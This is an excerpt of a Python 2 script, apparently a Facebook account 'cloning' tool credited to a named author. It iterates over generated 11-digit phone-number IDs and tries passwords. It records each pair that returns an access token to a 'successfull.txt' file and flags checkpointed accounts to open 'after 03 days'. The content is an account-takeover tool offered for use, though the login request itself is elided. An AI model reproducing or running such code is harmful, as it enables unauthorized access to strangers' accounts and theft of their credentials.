...
os.system('clear')
psb('\x1b[1;32mBANGLADESH MASUM 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : MD MASUM IKRUM'
    print 'FACEBOOK : Md Masum Ikrum'
    print 'GITHUB     : github.com/Mdmasumikrum'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Masum-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Masum-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
